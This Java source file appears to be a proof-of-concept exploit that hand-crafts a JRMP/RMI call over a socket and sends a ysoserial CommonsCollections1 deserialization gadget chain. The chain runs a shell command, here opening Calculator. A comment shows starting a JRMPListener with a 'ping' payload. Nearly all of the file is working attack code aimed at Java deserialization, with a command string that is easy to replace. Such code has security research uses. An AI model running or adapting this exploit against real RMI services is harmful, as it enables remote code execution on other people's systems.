package com.pocs.test;

import sun.rmi.transport.TransportConstants;
import org.su18.ysuserial.payloads.CommonsCollections1;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.net.Socket;
import java.rmi.server.ObjID;
import java.util.Arrays;

/*
* 1- run server
* java -server -Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=8453,server=y,suspend=n -Djava.compiler=NONE -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections1 "ping 10.12.35.59"
*
* */
public class TestLs {
    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("JRMPListener.ser"));
            os.writeObject(obj);
            os.flush();
            os.close();
            System.out.println("ok");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void setFinalStatic(Field field, Object newValue) throws Exception {
        field.setAccessible(true);

        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);

        field.set(null, newValue);
    }
    public static void main(String[] args) throws Exception {

//        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        Socket ssot = new Socket("127.0.0.1",4444);
        OutputStream output = ssot.getOutputStream();

//         ObjectOutputStream bos = new ObjectOutputStream(new FileOutputStream("JRMPListener.ser"));


        BufferedOutputStream bopts = new BufferedOutputStream(output);
        DataOutputStream oops = new DataOutputStream(bopts);
        int i = 0,magic = TransportConstants.Magic;
        // magic
        oops.writeInt(magic);
        oops.flush();
        // version
        short ver = TransportConstants.Version;
        oops.writeShort(ver);
        oops.flush();

        // protocol
        byte protocol = TransportConstants.SingleOpProtocol;
        oops.writeByte(protocol);
        oops.flush();
        // op
        int op = TransportConstants.Call;
        oops.write(op);
        oops.flush();
        ObjectOutputStream oops1 = new ObjectOutputStream(oops);
        /*/ 限定类型:
        [Ljava.rmi.server.ObjID
        java.rmi.server.ObjID
        java.rmi.server.UID
         */
        ///////////////*/

        // ObjID read(ObjectInput in)
        oops1.writeLong(2);
        oops1.flush();

        oops1.writeInt(2);
        oops1.flush();
        oops1.writeLong(2);
        oops1.flush();
        oops1.writeShort(2);
        oops1.flush();

        // 这里压入的对象的toString会执行 space.equals(mySpace)
        // method
        oops1.writeInt(i);
        oops1.flush();
        // hash
        oops1.writeLong(2);
        oops1.flush();

        System.getProperties().setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");
        Object x009= new CommonsCollections1().getObject("open /System/Applications/Calculator.app");
        oops1.writeObject(x009);
        oops1.flush();
//        bos.flush();
//        bos.close();
        output.flush();
        output.close();
        System.out.println("ok");

//        ObjID []x = {oj,oj};
//        oops.writeObject(x);
//
//        Arrays.toString((ObjID[])x);
    }
}
